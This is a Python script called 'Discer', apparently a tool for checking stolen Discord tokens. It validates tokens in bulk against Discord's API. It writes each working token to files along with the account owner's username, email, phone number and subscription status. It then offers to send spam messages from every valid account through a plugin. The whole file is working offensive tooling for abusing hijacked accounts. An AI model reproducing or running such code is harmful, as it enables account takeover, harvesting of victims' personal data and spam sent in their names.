import requests, os
import os
import sys
import configparser
from colorama import Fore, Style
import requests
import emoji
import time
import concurrent.futures
if os.path.exists("plugins/DSM.py"):
    from plugins.DSM import *
from qgui.qd import *
goodtokens = 0
badtokens = 0
valid_tokens = []
version = "1.3"
def great_message(message):
    print(emoji.emojize(f"{message}"))
def write_valid_tokens(filename, tokens):
    with open(filename, 'w', encoding="utf-8") as outfile:
        for token in tokens:
            outfile.write(token + '\n')
def write_runtime_token(filename,token):
    with open(filename, 'a', encoding="utf-8") as outfile:
        outfile.write(token + '\n')
def full_logsfile(filename, username, email, phone, verified, nitro, friends_list, token):
    if username != '' and email != '':
        nameinmes = emoji.emojize(f":memo:Username - {username}")
        if verified == True:
            verif = emoji.emojize(" :check_mark_button: Profile is verified!")
        else:
            verif = emoji.emojize(" :cross_mark: It seems like the account is auto-reg")
        if nitro in [1, 2, 3]:
            nitroinf = emoji.emojize(' :rocket: Account has nitro!')
        else:
            nitroinf = emoji.emojize(' :rock: Does not have an active nitro sub')
        mes = emoji.emojize(f" :clipboard: token - {token}\n :closed_mailbox_with_raised_flag:email - {email}\n :mobile_phone:phone - {phone}\n :people_hugging:friends - {friends_list}\n\n\n")
        log = f"{nameinmes}\n{nitroinf}\n{verif}\n{mes}\n"  # Convert the log tuple to a string
        with open(filename, 'a', encoding="utf-8") as outfile:
            outfile.write(log)
    else:
        pass


def check_token(token):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        "Authorization": token
    }
    global goodtokens
    global badtokens
    global valid_tokens
    username = ""
    email = ""
    phone = ""
    verified = False
    nitro = 0
    friends_list = []
    token_response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if token_response.status_code == 200:

        req = requests.get("https://discord.com/api/v9/users/@me",headers=headers)
        username = req.json()['username']
        email = req.json()['email']
        phone = req.json()['phone']
        verified = req.json()['verified']
        print(f"{Fore.GREEN}--------------------------------------------------------------------------------")
        print(emoji.emojize(f":check_mark_button: Valid - {token}{Style.RESET_ALL}"))
        if num_threads < 2:
            great_message(":clipboard: Getting info about token..")
            great_message(f":memo:Username - {username}")
            if verified == True:
                great_message(" :check_mark_button: Profile is verified!")
            else:
                great_message(" :cross_mark: It seems like account auto-reg")
            nitro = req.json()['premium_type']
            if nitro in [1 , 2 , 3]:
                great_message(' :rocket: Account have nitro!')
            else:
                great_message(' :rock: Dont have active nitro sub')
            # friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers)
            # for i in friends.json():
            #     friends_list.append(f"{i} {'username'}")
            valid_tokens.append(token)
            great_message(f" :closed_mailbox_with_raised_flag:email - {email}\n :mobile_phone:phone - {phone}\n :people_hugging:friends - {friends_list}")
        else:
            print(f"{Fore.GREEN}--------------------------------------------------------------------------------")
        goodtokens += 1
        write_runtime_token('valid_tokens.txt', token)
        #print("--------------------------------------------------------------------------------")
    else:
        print(f"{Fore.RED}--------------------------------------------------------------------------------")
        great_message(f":cross_mark:An error occurred or the Discord token is not valid: {token}")
        badtokens += 1
        print(f"--------------------------------------------------------------------------------{Style.RESET_ALL}")
    full_logsfile('full_logsfile.txt', username, email, phone, verified, nitro, friends_list, token)
    return username, email, phone, token, nitro, verified
def main():
    vergh = "https://githubraw.com/quickyyy/Discer/main/version"
    os.system("cls")
    os.system("title Discer / @bredcookie / Version: getting..")
    getinfo("Welcome", "Welcome to the Discer - Discord token checker") 
    getinfo("Welcome", "Dev - https://zelenka.guru/quka/ | My Telegram blog - https://t.me/bredcookie")
    lastver = getver(vergh)
    comparison_result = compare_versions(version, lastver)
    if comparison_result == 1:
        getinfo("Version", f"{Fore.WHITE}Version of script: {version}{Style.RESET_ALL} Version of last script: {lastver} (Чего блять? У тебя бета что-ли?)")
        os.system(f"title Discer / @bredcookie / Version: {version} (beta?)")
    elif comparison_result == -1:
        getinfo("Version", f"{Fore.WHITE}New version of script avalibale! Re-download from creator{Style.RESET_ALL}")
        getinfo("Version", f"{Fore.WHITE}Version of script: {version}{Style.RESET_ALL} Version of last script: {lastver}")
        os.system(f"title Discer / @bredcookie / Version: {version} (OLD)")
    elif comparison_result == 0:
        getinfo("Version", f"{Fore.WHITE}Version of script: {version}{Style.RESET_ALL} You have last version, cool!")
        os.system(f"title Discer / @bredcookie / Version: {version}")
    if os.path.exists("plugins/DSM.py"):
        getinfo("DSM", "DSM Plugin finded")
    token_file = coolinput("Please, enter token file name (If not specified, the tokens.txt will be checked): ")
    if token_file == '':
        token_file = os.getcwd() + "/tokens.txt"
    else:
        token_file = os.getcwd() + "/" + token_file
    global num_threads
    num_threads = int(coolinput("Enter the number of threads: "))

    
    with open(token_file, 'r', encoding="utf-8") as infile:
        lines = infile.readlines()
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(check_token, line.strip()) for line in lines]

        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f"An error occurred: {exc}")

    #write_valid_tokens('valid_tokens.txt', valid_tokens)
    
    if badtokens > goodtokens:
         great_message(f":bar_chart:All work is done! Stat for this check: {Fore.GREEN}:chart_decreasing: Good tokens - {goodtokens}{Style.RESET_ALL} | {Fore.RED}:chart_increasing: Bad tokens - {badtokens}{Style.RESET_ALL} | :input_numbers: Amount of tokens : {goodtokens+badtokens}")
    else:
         great_message(f":bar_chart:All work is done! Stat for this check: {Fore.GREEN}:chart_increasing: Good tokens - {goodtokens}{Style.RESET_ALL} | {Fore.RED}:chart_decreasing: Bad tokens - {badtokens}{Style.RESET_ALL} | :input_numbers: Amount of tokens : {goodtokens+badtokens}")
    getinfo("DSM",f"Would you like to spam {goodtokens} tokens in private messages? (Yes/No)")
    DSMON = coolinput("")
    if DSMON == "yes".lower():
        spammessage = coolinput("What message do you want to send across all valid tokens?: ")
        for goodtoken in goodtokens:
            send_message_to_private_channels(goodtoken, spammessage)
    else:
        getinfo("DSM", "DSM turned off. Bye!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        geterror("keyboard", "Get ctrl+c!")
        if badtokens > goodtokens:
            great_message(f":bar_chart:All work is done! Stats for this check: {Fore.GREEN}:chart_decreasing: Good tokens - {goodtokens}{Style.RESET_ALL} | {Fore.RED}:chart_increasing: Bad tokens - {badtokens}{Style.RESET_ALL} | :input_numbers: Amount of tokens : {goodtokens+badtokens}")
        else:
            great_message(f":bar_chart:All work is done! Stats for this check: {Fore.GREEN}:chart_increasing: Good tokens - {goodtokens}{Style.RESET_ALL} | {Fore.RED}:chart_decreasing: Bad tokens - {badtokens}{Style.RESET_ALL} | :input_numbers: Amount of tokens : {goodtokens+badtokens}")
        time.sleep(6)
        sys.exit()
